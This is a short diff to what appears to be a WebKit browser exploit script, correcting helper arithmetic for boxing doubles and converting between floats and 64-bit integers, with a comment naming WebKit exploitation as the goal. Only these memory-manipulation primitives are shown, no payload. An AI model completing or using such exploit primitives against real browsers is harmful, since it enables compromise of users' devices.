@@ -336,7 +336,7 @@ function iv(x){
 // That's all the arithmetic we need for exploiting WebKit.. :)
 
           // constant added to double JSValues
-          const kBoxedDoubleOffset = 0x0002000000000000;
+          const kBoxedDoubleOffset = new Int64("0x0002000000000000");;
           function boxDouble(d) {
             return Add(d,kBoxedDoubleOffset);
           }
@@ -349,11 +349,11 @@ function iv(x){
           let u = new Uint32Array(f.buffer);
           function f2dec(floatpoint) {
                 f[0] = floatpoint;
-                return (u[1]*kBoxedDoubleOffset+u[0]).toString(16);
+                return (u[1]*0x100000000+u[0]).toString(16);
           }
           function dec2f(dec) {
-                u[0] = dec%kBoxedDoubleOffset;
-                u[1] = dec/kBoxedDoubleOffset;
+                u[0] = dec%0x100000000;
+                u[1] = dec/0x100000000;
                 return f[0];
           }
           // store things to prevent GC
